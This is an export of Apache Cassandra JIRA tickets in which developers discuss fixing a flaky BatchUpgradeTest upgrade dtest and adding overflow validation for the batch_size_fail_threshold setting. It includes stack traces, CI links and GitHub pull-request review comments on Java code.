Correct but the alternative is to pollute and maybe release the {{isUpgradingFromVersionLowerThan()}} method with test debug msgs. I prefer to try my luck on getting a lucky test run that logs what I need. Sounds reasonable?

bq. within the synchronized block in the get method expirationNanos will always be equals to {{ nanos}} as it cannot be equals to zero

Unless an expiration happens setting it to 0, where it will not meet the if and return the memoized value. Leaving everything ready for the next get() to refresh the memoized value.

bq. expire is setting expirationNanos outside of a synchronize block
Isn't all this part of the expiration + double check locking logic?
- Non-memoized instances will always have a 0, meet {{if (nanos == this.expirationNanos)}} and return the non-memoized value always
- Memoized instances might get an unlucky expiration breaking the if where they will return the memoized value. The next get will force a refresh of the memoized value.

Iiuc the only hole I see if we might be swallowing expires() when overwriting {{expirationNanos}} inside the sync block. Getting expire() inside a sync block should suffice, do you agree?

;;;","24/Jun/22 16:57;blerer;{quote}Geeting expire() inside a sync block should suffice, do you agree?{quote}
Yes

{quote}Unless an expiration happens setting it to 0, where it will not meet the if and return the memoized value. Leaving everything ready for the next get() to refresh the memoized value.{quote}

What I mean is that:
{code}
nanos = now + this.durationNanos;
this.expirationNanos = nanos == 0L ? 1L : nanos;
{code}
can be simplified to:
{code}
this.expirationNanos = now + this.durationNanos;
{code} 

 {quote}I prefer to try my luck on getting a lucky test run that logs what I need. Sounds reasonable?{quote}
Luck does not tend to be something really reliable in my opinion. 
The alternative for me is to modify the method to allow us to capture the information we need. We could return a Pair<Boolean, CassandraVersion> for example
;;;","27/Jun/22 10:11;bereng;Ok rebased and pushed changes as agreed.;;;","07/Jul/22 09:45;blerer;+1;;;","08/Jul/22 08:54;bereng;Both PRs are up and CI is good. Leaving the commit for Monday to give [~blerer] time for a final pass, otherwise I'll merge as agreed offline.;;;","06/Apr/23 11:33;adelapena;It seems that {{InsertUpdateIfConditionTest}} and {{InsertUpdateIfConditionCollectionsTest}} is still flaky, as reported in CASSANDRA-18393. The new errors are of the form:
{code}
junit.framework.AssertionFailedError: 4.2.0-SNAPSHOT boolean:false
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.lambda$data$0(InsertUpdateIfConditionTest.java:68)
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.beforeSetup(InsertUpdateIfConditionTest.java:97)
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.before(InsertUpdateIfConditionTest.java:91)
{code}
and:
{code}
unit.framework.AssertionFailedError: 4.2.0-SNAPSHOT boolean:false
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.lambda$data$1(InsertUpdateIfConditionTest.java:72)
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.beforeSetup(InsertUpdateIfConditionTest.java:97)
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.before(InsertUpdateIfConditionTest.java:91)
{code}
Bisect points to this ticket as the one introducing the change on the error messages:
 * Before: [commit|https://github.com/apache/cassandra/commit/89f3978dcde958fbad191b8cf628fd89ace64d7a] [CI|https://app.circleci.com/pipelines/github/adelapena/cassandra/2803/workflows/dc769b19-b383-4332-92db-12e7e54a49fa]
 * After: [commit|https://github.com/apache/cassandra/commit/cc28e1a85e2e5760436030ca57667fa69d6de233] [CI|https://app.circleci.com/pipelines/github/adelapena/cassandra/2804/workflows/5bec4990-05da-4879-b097-57116c30ba5b]

Bisection also shows that the original failures were introduced for the first time by CASSANDRA-16930:
 * Before: [commit|https://github.com/apache/cassandra/commit/ce2a0a28bc9ca21e1fae29f2a38448a877db06c3] [CI|https://app.circleci.com/pipelines/github/adelapena/cassandra/2807/workflows/e08f482a-40bd-4dfc-b322-353572717ada]
 * After: [commit|https://github.com/apache/cassandra/commit/fe9cff663b48fecdb964caaded2004e83a0c89f4] [CI|https://app.circleci.com/pipelines/github/adelapena/cassandra/2808/workflows/a63798dd-1916-4ef6-9e4c-9962127fc66b];;;","11/Apr/23 05:16;bereng;Let's continue the conversation in CASSANDRA-18393 imo;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky dtest - org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest ,CASSANDRA-17651,13446349,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,brandon.williams,brandon.williams,23/May/22 10:59,05/Oct/22 22:30,13/Jul/23 08:40,14/Jul/22 15:21,4.1,4.1-alpha1,5.0,,,,Consistency/Batch Log,,,,0,,"{code}
org.apache.cassandra.distributed.shared.ShutdownException: Uncaught exceptions were thrown during test
	at org.apache.cassandra.distributed.impl.AbstractCluster.checkAndResetUncaughtExceptions(AbstractCluster.java:1056)
	at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1042)
	at org.apache.cassandra.distributed.upgrade.UpgradeTestBase$TestCase.run(UpgradeTestBase.java:239)
	at org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest(BatchUpgradeTest.java:53)
	Suppressed: java.lang.RuntimeException: java.lang.AssertionError
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:108)
		at org.apache.cassandra.distributed.impl.Instance.lambda$null$6(Instance.java:495)
		at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
		at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
		at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.lang.AssertionError
		at org.apache.cassandra.locator.TokenMetadata.firstTokenIndex(TokenMetadata.java:1171)
		at org.apache.cassandra.locator.TokenMetadata.firstToken(TokenMetadata.java:1185)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getNaturalReplicas(AbstractReplicationStrategy.java:95)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getLocalReplicaFor(AbstractReplicationStrategy.java:111)
		at org.apache.cassandra.db.ReadCommandVerbHandler.validateTransientStatus(ReadCommandVerbHandler.java:108)
		at org.apache.cassandra.db.ReadCommandVerbHandler.doVerb(ReadCommandVerbHandler.java:50)
		at org.apache.cassandra.net.InboundSink.lambda$new$0(InboundSink.java:78)
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:97)
{code}

https://ci-cassandra.apache.org/job/Cassandra-4.1/34/testReport/org.apache.cassandra.distributed.upgrade/BatchUpgradeTest/batchTest/",,adelapena,bereng,jonmeredith,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17641,,,CASSANDRA-17636,,,,,,CASSANDRA-17652,,,,,,CASSANDRA-17307,CASSANDRA-17310,CASSANDRA-17642,CASSANDRA-17636,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jul 14 15:17:31 UTC 2022,,,,,,,All,,,,"0|z12lnk:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/27a31f4cfabb3faf65efc38ef866f7c1f78779ed,,,,,,,,,In ticket,,,,,"25/May/22 09:27;bereng;Probably a dup of CASSANDRA-17641;;;","30/Jun/22 19:48;jonmeredith;I just merged CASSANDRA-17636 which looks like it might solve the root cause of the problem - delivering messages when the messaging service is usually shut down.;;;","01/Jul/22 05:17;bereng;Agreed CASSANDRA-17636 is the root cause. Optimistically closing all these duplicates and we can reopen if needed.;;;","05/Jul/22 22:02;maedhroz;Did this just fail again today? https://ci-cassandra.apache.org/job/Cassandra-4.1/86/testReport/

EDIT: It's a different failure, but this is already linked to Butler...so repurpose it? :D;;;","06/Jul/22 05:33;bereng;Mmmmm it failed but in a new way. I guess we keep this ticket open then;;;","12/Jul/22 15:19;adelapena;The failure can be reproduced on CircleCI with the test multiplexer:
{code}
.circleci/generate.sh -m \
  -e REPEATED_JVM_UPGRADE_DTEST_CLASS=org.apache.cassandra.distributed.upgrade.BatchUpgradeTest \
  -e REPEATED_JVM_UPGRADE_DTEST_COUNT=500
{code}
It seems to have [a flakiness of around 1%|https://app.circleci.com/pipelines/github/adelapena/cassandra/1915/workflows/231a7018-df32-45d1-a1be-265d86922d39/jobs/19106].

The test [survives 500 iterations|https://app.circleci.com/pipelines/github/adelapena/cassandra/1916/workflows/1b54b401-8ff3-4a48-b7a9-3ad14dfc97f6/jobs/19107] if we use {{spinAssertEquals}} to wait for the processing of the stored batch mutations, [this way|https://github.com/adelapena/cassandra/commit/ce9dfc06cbed0fef88b422a313fdcc73459d13ea].;;;","12/Jul/22 15:22;brandon.williams;+1, thanks!;;;","13/Jul/22 05:12;bereng;I was looking/following this one as well as it sounded very familiar to the GroupCommitLogTest (17232 ). +1 from me as well.;;;","14/Jul/22 12:26;adelapena;Thanks for the reviews. Here is a final CI round for 4.1 and trunk before committing, without any test failures:
||Patch||CI||
|[4.1|https://github.com/adelapena/cassandra/commit/238a5e31839e530c63762fea7216dcf42f55c162]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1929/workflows/d45c8bc5-889d-4e46-b14d-edb446be45ac]|
|[trunk|https://github.com/adelapena/cassandra/commit/3428554db7a24e37298096c77973339d1218c3ba]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1928/workflows/e982129a-469d-4896-b099-22658a35bcd6]|;;;","14/Jul/22 15:17;adelapena;Committed to {{cassandra-4.1}} as [27a31f4cfabb3faf65efc38ef866f7c1f78779ed|https://github.com/apache/cassandra/commit/27a31f4cfabb3faf65efc38ef866f7c1f78779ed] and merged to [{{trunk}}|https://github.com/apache/cassandra/commit/520fb2bb24cef6891ec9912690b0e94d2ff2016c];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Check startup and setter validations for batch_size_fail_threshold,CASSANDRA-17650,13446121,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Low,Fixed,akin-tekeoglu,e.dimitrova,e.dimitrova,20/May/22 21:18,05/Oct/22 22:22,13/Jul/23 08:40,28/Jun/22 22:28,4.1,4.1-beta1,5.0,,,,Local/Config,,,,0,,"During manual inspection it was noticed that batch_size_warn_threshold goes through checkValidForByteConversion, but this is not the case for batch_size_fail_threshold.

This ticket is opened to check whether this is a bug or not. 

If it is confirmed it is a bug it needs to be fixed and the ticket can be changed to type bug. It seems that this validation was added as part of CASSANDRA-15470 to 4.0+. Maybe we also need it in 3.0 and 3.11? 

CC [~adelapena] ",,adelapena,akin-tekeoglu,e.dimitrova,jmckenzie,,,,,,,,,,,"akin-tekeoglu opened a new pull request, #1696:
URL: https://github.com/apache/cassandra/pull/1696

   I also fixed the `batch_size_warn_threshold ` test. It was checking against `column_index_size` before.
   
   [Task](https://issues.apache.org/jira/browse/CASSANDRA-17650)
   
   


;20/Jun/22 22:28;githubbot;600","adelapena commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902597039


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   Nit: the final brace should be on a new line, K&R style:
   ```suggestion
       private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName)
       {
   ```
   Also, the `byteValue` argument is meant to contain a value in kibibytes, so we should probably name it `kibibyteValue`. Or maybe just `kibibytes`, as it's named in the`DataStorageSpec.IntKibibytesBound` constructor that we use immediately below:
   ```suggestion
       private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int kibibytes, String configName)
       {
   ```
   I would also rename the `configName` argument to `propertyName`, I think:
   ```suggestion
       private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int kibibytes, String propertyName)
       {
   ```
   I wonder if we should put this new method and the related `checkValidForByteConversion` closer to each other in the file, wdyt?
   
   One last thought about this is that perhaps we should move this validation into `DataStorageSpec.IntKibibytesBound`, maybe with a validation method or with static constructor performing the validation. But we don't have to do that during this ticket.



##########
test/unit/org/apache/cassandra/config/DatabaseDescriptorTest.java:
##########
@@ -326,7 +326,24 @@ public void testExceptionsForInvalidConfigValues() {
             fail(""Should have received a ConfigurationException batch_size_warn_threshold = 2GiB"");
         }
         catch (ConfigurationException ignored) { }
-        Assert.assertEquals(4096, DatabaseDescriptor.getColumnIndexSize());

Review Comment:
   Good catch!



;21/Jun/22 13:08;githubbot;600","adelapena commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902597039


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   Nit: the final brace should be on a new line, K&R style:
   ```suggestion
       private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName)
       {
   ```
   Also, the `byteValue` argument is meant to contain a value in kibibytes, so we should probably name it `kibibyteValue`. Or maybe just `kibibytes`, as it's named in the`DataStorageSpec.IntKibibytesBound` constructor that we use immediately below:
   ```suggestion
       private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int kibibytes, String configName)
       {
   ```
   I would also rename the `configName` argument to `propertyName`, I think:
   ```suggestion
       private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int kibibytes, String propertyName)
       {
   ```
   I wonder if we should put this new method and the related `checkValidForByteConversion` closer to each other in the file, wdyt?
   
   One last thought about this is that perhaps we should move this validation into `DataStorageSpec.IntKibibytesBound`, maybe with a validation method or with a static constructor performing the validation. But we don't have to do that during this ticket.



;21/Jun/22 13:09;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902729732


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   batch_size_fail_threshold doesn't need the validation and I assumed this part of the patch will be removed.
   Anyway, I am not against adding a nice utility method and agree with @adelapena's review comments.
   
   > One last thought about this is that perhaps we should move this validation into DataStorageSpec.IntKibibytesBound, maybe with a validation method or with a static constructor performing the validation. But we don't have to do that during this ticket. 
   
   Didn't we intentionally leave it out of those classes and opted out of custom static methods and constructors as it is a corner case for only a few parameters?  I thought we didn't want to encourage too much customizations in those classes to ensure we keep them clean, only in case we consider this will be a very common case.



;21/Jun/22 14:57;githubbot;600","adelapena commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902776217


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   I think the widening that was used before instead of validation was broken by the adoption of `DataStorageSpec.IntKibibytesBound.toBytes`, which returns an `int`. So we have to either add new conversion method or also use validation here. Probably the former for compatibility, although I'm not sure.
   
   As for moving validation logic into `DataStorageSpec`, I was thinking not in moving the entire method as it is but the logic to verify that the value can be converted to a lesser unit without losing precision. Perhaps a method returning a boolean saying whether the conversion to a unit is going to produce precision loss, so the validator on `DatabaseDescriptor` can use it. That would be a single utility method on `DataStorageSpec`, not extending to their child classes. But as I mentioned, I think we don't have to do that, if we do it, here.



;21/Jun/22 15:37;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902821882


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   Thankfully we don't need to handle the precision issue here as going to smaller unit we use multiplication. Overflow is the only issue we need to handle. 
   Yes, both` DataStorageSpec.IntKibibytesBound` and `DataStorageSpec.IntMebibytesBound` will need something like `toBytesInLong`.
   
   It seems that `batch_size_fail_threshold` is the only parameter of type `IntKibibytesBound` that suffers from this issue. 
   Now, I went ahead and did a further check for the other properties that are widen to long as it seems this bug was introduced when we removed the static methods from `DataStorageSpec`.
   We will need to add `toBytesInLong` also for `IntMebibytesBound` to cover ```
   getMinFreeSpacePerDriveInBytes() / min_free_space_per_drive,
   compaction_large_partition_warning_threshold / getMinFreeSpacePerDriveInBytes(), getMaxHintsFileSize() / max_hints_file_size
   ```
   



;21/Jun/22 16:21;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902821882


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   Thankfully we don't need to handle the precision issue here as going to smaller unit we use multiplication. Overflow is the only issue we need to handle. 
   Yes, both` DataStorageSpec.IntKibibytesBound` and `DataStorageSpec.IntMebibytesBound` will need something like `toBytesInLong`.
   
   It seems that `batch_size_fail_threshold` is the only parameter of type `IntKibibytesBound` that suffers from this issue. 
   Now, I went ahead and did a further check for the other properties that are widen to long as it seems this bug was introduced when we removed the static methods from `DataStorageSpec`.
   We will need to add `toBytesInLong` also for `IntMebibytesBound` to cover
   ```
   getMinFreeSpacePerDriveInBytes() / min_free_space_per_drive,
   compaction_large_partition_warning_threshold / getMinFreeSpacePerDriveInBytes(), getMaxHintsFileSize() / max_hints_file_size
   ```
   
   



;21/Jun/22 16:21;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902822512


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   Not sure whether we want to cover all this in this one ticket or split



;21/Jun/22 16:21;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902833880


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   One more thing on my mind. I think further to adding comment it will be great if we add some unit tests for the bounds which will prevent people from regressing again in the future. It is confusing and easy to miss



;21/Jun/22 16:33;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r902833880


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   One more thing on my mind. I think further to adding comment it will be great if we add some unit tests for the bounds of those properties which will prevent people from regressing again in the future. It is confusing and easy to miss



;21/Jun/22 16:34;githubbot;600","akin-tekeoglu commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r903060636


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   @ekaterinadimitrova2 @adelapena I have a couple of questions
   
   1. Why do we have `DataStorageUnit` as a constructor parameter in subclasses of `DataStorageSpec`? E.g., Isn't `IntKibibytesBound` represents values like 1 KiB, 100 KiB. Why do we have an option like this `new DataStorageSpec.IntKibibytesBound(10, MEBIBYTES)`
   
   2. Shouldn't the `quantity` of the constructor of IntBound classes be int? It is long right now.
   
   3. What is the upper limit of  `batch_size_fail_threshold`?
   
   Either I missed the idea behind `DataStorageSpec`, or the class hierarchy is misleading.



;21/Jun/22 20:55;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r903092123


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
